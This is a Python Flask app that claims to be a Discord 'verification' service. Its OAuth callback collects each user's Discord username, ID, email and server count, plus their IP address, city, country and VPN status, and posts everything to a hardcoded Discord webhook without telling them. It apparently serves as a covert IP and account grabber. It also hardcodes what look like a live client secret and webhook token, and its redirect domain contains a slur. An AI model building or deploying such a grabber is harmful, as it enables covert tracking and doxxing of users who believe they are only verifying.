from flask import Flask, request, redirect, jsonify
import requests
import json
from datetime import datetime
import traceback

app = Flask(__name__)

# Configuration
CLIENT_ID = "1499869968899244252"
CLIENT_SECRET = "G2Z-Hx8fSOv8d_DsROLk0k-CZdFBrbA5"
REDIRECT_URI = "https://negro-lemon.vercel.app/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1498739271006294016/_4sdyqbsQ6UPC7GP1HPtqnWAf7qPuwCf4G4HYWLVqawxX6iWpHR4kZtpb12W9UJykAT-"

def get_user_ip(request):
    if request.headers.get('X-Forwarded-For'):
        return request.headers.get('X-Forwarded-For').split(',')[0].strip()
    return request.remote_addr

def get_geo_location(ip):
    try:
        resp = requests.get(f"https://ipapi.co/{ip}/json/", timeout=5)
        geo_data = resp.json()
        return {
            "country": geo_data.get('country_name', 'Unknown'),
            "city": geo_data.get('city', 'Unknown'),
            "region": geo_data.get('region', 'Unknown'),
            "vpn": geo_data.get('proxy', False) or geo_data.get('vpn', False),
            "mobile": geo_data.get('mobile', False)
        }
    except:
        return {"error": "Geo unavailable"}

def send_to_webhook(user_data, guilds_data, user_ip, geo_info):
    guilds_count = len(guilds_data) if isinstance(guilds_data, list) else 0
    
    embed = {
        "title": "🔐 **New User Verification**",
        "color": 0x57F287,
        "timestamp": datetime.now().isoformat(),
        "fields": [
            {
                "name": "👤 **User**",
                "value": f"**Username:** {user_data.get('username', 'Unknown')}\n**ID:** `{user_data.get('id', 'Unknown')}`",
                "inline": False
            },
            {
                "name": "📧 **Email**",
                "value": f"**Email:** {user_data.get('email', 'No email')}\n**Verified:** {'✅ Yes' if user_data.get('verified') else '❌ No'}",
                "inline": True
            },
            {
                "name": "📁 **Servers**",
                "value": f"**Total:** {guilds_count}",
                "inline": True
            },
            {
                "name": "🌐 **Location**",
                "value": f"**IP:** {user_ip}\n**City:** {geo_info.get('city', 'Unknown')}\n**Country:** {geo_info.get('country', 'Unknown')}\n**VPN:** {'⚠️ Yes' if geo_info.get('vpn') else '✅ No'}",
                "inline": False
            }
        ]
    }
    
    if user_data.get('avatar'):
        embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png"}
    
    try:
        requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    except Exception as e:
        print(f"Webhook error: {e}")

@app.route('/')
def home():
    return jsonify({"status": "online", "service": "Discord Verification API"})

@app.route('/callback')
def callback():
    code = request.args.get('code')
    
    if not code:
        return redirect("https://guns.lol/j8a?error=no_code")
    
    user_ip = get_user_ip(request)
    geo_info = get_geo_location(user_ip)
    
    try:
        token_response = requests.post(
            "https://discord.com/api/oauth2/token",
            data={
                "client_id": CLIENT_ID,
                "client_secret": CLIENT_SECRET,
                "grant_type": "authorization_code",
                "code": code,
                "redirect_uri": REDIRECT_URI
            },
            headers={"Content-Type": "application/x-www-form-urlencoded"}
        )
        
        token_json = token_response.json()
        access_token = token_json.get('access_token')
        
        if not access_token:
            return redirect("https://guns.lol/j8a?error=token_failed")
        
        user_response = requests.get(
            "https://discord.com/api/users/@me",
            headers={"Authorization": f"Bearer {access_token}"}
        )
        user_data = user_response.json()
        
        guilds_response = requests.get(
            "https://discord.com/api/users/@me/guilds",
            headers={"Authorization": f"Bearer {access_token}"}
        )
        guilds_data = guilds_response.json() if guilds_response.status_code == 200 else []
        
        send_to_webhook(user_data, guilds_data, user_ip, geo_info)
        
        print(f"✅ Verified: {user_data.get('username')} - IP: {user_ip}")
        
        return redirect("https://guns.lol/j8a?verified=true")
        
    except Exception as e:
        print(f"Error: {e}")
        return redirect("https://guns.lol/j8a?error=unknown")

if __name__ == "__main__":
    app.run()
